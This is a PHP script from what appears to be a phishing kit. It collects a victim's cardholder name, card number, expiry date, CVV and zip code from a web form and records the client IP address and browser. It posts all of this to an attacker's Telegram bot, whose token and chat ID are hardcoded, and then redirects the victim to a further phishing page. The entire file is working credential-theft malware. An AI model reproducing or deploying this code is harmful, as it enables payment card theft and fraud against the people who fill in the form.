<?php
error_reporting(E_ALL);

function foo($botToken, $chatID, $cardholder, $cardnumber, $exp, $cvv, $zipcode, $message) {
    if (!empty($cardholder) && !empty($cardnumber) && !empty($exp) && !empty($cvv)) {
        $telegramAPI = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = [
            'chat_id' => $chatID,
            'text' => $message,
        ];
        $curl = curl_init($telegramAPI);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        curl_close($curl);
        sleep(5);
        header("Location: ./email.html");
        exit;
			
    
    } else {
        echo "<script>setTimeout(function() { window.history.go(-1); document.querySelectorAll('input[type=number]').forEach(function(input) { input.value = '';}); }, 0);</script>";
        exit;
    }
}

$cardholder = $_POST['cardholder'] ?? "";
$cardnumber = $_POST['cardnumber'] ?? "";
$exp = $_POST['exp'] ?? "";
$cvv = $_POST['cvv'] ?? "";
$zipcode = $_POST['zipcode'] ?? "";

$message = "----------------CARD INFO---------------\n";
$message .= "NAME         : " . $cardholder . "\n";
$message .= "CARD      : " . $cardnumber . "\n";
$message .= "EXP         : " . $exp . "\n";
$message .= "CVV      : " . $cvv . "\n";
$message .= "ZIP      : " . $zipcode . "\n";
$message .= "----------------IP's INFO------------\n";
$message .= "CLIENT IP     : " . getenv("REMOTE_ADDR") . "\n";
$message .= "IP LINK       : https://www.geodatatool.com/?IP=" . getenv("REMOTE_ADDR") . "\n";
$message .= "BROWSER       : " . $_SERVER['HTTP_USER_AGENT'] . "\n";

foo('8130694927:AAHH1H6rLldhEcC-BzNrvzbKpGsJsxvqh1Y', '7528859168', $cardholder, $cardnumber, $exp, $cvv, $zipcode, $message);
?>